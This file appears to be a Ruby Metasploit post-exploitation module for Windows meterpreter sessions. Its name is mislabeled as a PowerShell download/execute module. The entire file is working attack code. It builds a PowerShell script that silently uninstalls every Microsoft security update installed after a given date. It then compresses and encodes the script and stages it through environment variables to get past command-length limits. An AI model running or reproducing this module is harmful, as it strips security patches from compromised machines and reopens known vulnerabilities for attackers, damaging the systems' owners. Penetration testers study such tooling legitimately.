##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

##
# This script is built upon the original method by rel1k and winfang98 at DEF CON 18
# Modifications were made to simply run the PowerShell commands necessary to unpatch
# a Windows box from all security updates.  Functionality to add scripts or script commands
# were removed from the original.
##

require 'zlib' # TODO: check if this can be done with REX
require 'msf/core'
require 'rex'
require 'date'

class Metasploit3 < Msf::Post
  include Msf::Post::Windows::Powershell

  def initialize(info={})
    super(update_info(info,
      'Name'                 => "Windows Manage PowerShell Download and/or Execute",
      'Description'          => %q{
        This module will seek out all Windows updates on a machine and remove any security updates
        from Microsoft.  The user may also simply list the updates to see what is installed.
        Setting VERBOSE to true will output both the script prior to execution and the results.
      },
      'License'              => MSF_LICENSE,
      'Platform'             => ['win'],
      'SessionTypes'         => ['meterpreter'],
      'Author'               => [
        'Mike Ham', # modifications to include unpatching PowerShell code and cleanup
        'Nicholas Nam (nick[at]executionflow.org)', # original meterpreter script
        'RageLtMan' # post module
        ]
    ))

    register_options(
      [
        # OptBool.new('LIST', [true, 'List the installed security updates only', false]), # list the updates only
        OptBool.new('UNINSTALL', [true, 'Uninstall matching security updates', true]), # uninstall the updates found
        OptString.new('DATE', [false, 'Patches on or after date (MM/DD/YYY)', '01/01/1970']) # find patches installed on or after a date
      ], self.class)

    register_advanced_options(
      [
        OptBool.new(  'DELETE',        [false, 'Delete file after execution', false ]),
        OptBool.new(  'DRY_RUN',        [false, 'Only show what would be done', false ]),
        OptInt.new('TIMEOUT',   [true, 'Execution timeout', 120]),
      ], self.class)

  end

  def run

    # Make sure we meet the requirements before running the script, note no need to return
    # unless error
    return 0 if ! (session.type == "meterpreter" || have_powershell?)

    # Make sure we are working with a valid date
    begin
      Date.parse(datastore['DATE'])
    rescue ArgumentError
      print_status('Invalid date entered (MM/DD/YYYY)')
      return 0
    end

    # End of file marker
    eof = Rex::Text.rand_text_alpha(8)
    env_suffix = Rex::Text.rand_text_alpha(8)

    # Check/set vars and figure out what script we need to run
    script_in = '$date = "TEMP_DATE"; $hotfixes = Get-Hotfix | ? InstalledOn -gt $date | ? Description -eq "Security Update"; foreach ($h in $hotfixes){$hotfixID = $h.HotFixID.Replace("KB",""); C:\Windows\SysNative\WindowsPowerShell\v1.0\PowerShell.exe -command "cmd.exe /c wusa.exe /uninstall /KB:$hotfixID /quiet /norestart"; }'
    script_in.gsub! 'TEMP_DATE', datastore['DATE']
    print_status('Uninstalling.')


    # Print off what the script will look like 
    print_status(script_in)

    # Compress
    print_status('Compressing script contents.')
    compressed_script = compress_script(script_in, eof)
    if datastore['DRY_RUN']
      print_good("powershell -EncodedCommand #{compressed_script}")
      return
    end

    # If the compressed size is > 8100 bytes, launch stager
    if (compressed_script.size > 8100)
      print_error("Compressed size: #{compressed_script.size}")
      error_msg =  "Compressed size may cause command to exceed "
      error_msg += "cmd.exe's 8kB character limit."
      print_error(error_msg)
      print_status('Launching stager:')
      script = stage_to_env(compressed_script, env_suffix)
      print_good("Payload successfully staged.")
    else
      print_good("Compressed size: #{compressed_script.size}")
      script = compressed_script
    end

    # Execute the powershell script
    print_status('Executing the script.')
    cmd_out, running_pids, open_channels = execute_script(script, datastore['TIMEOUT'])

    # That's it
    print_good('Finished!')
  end

end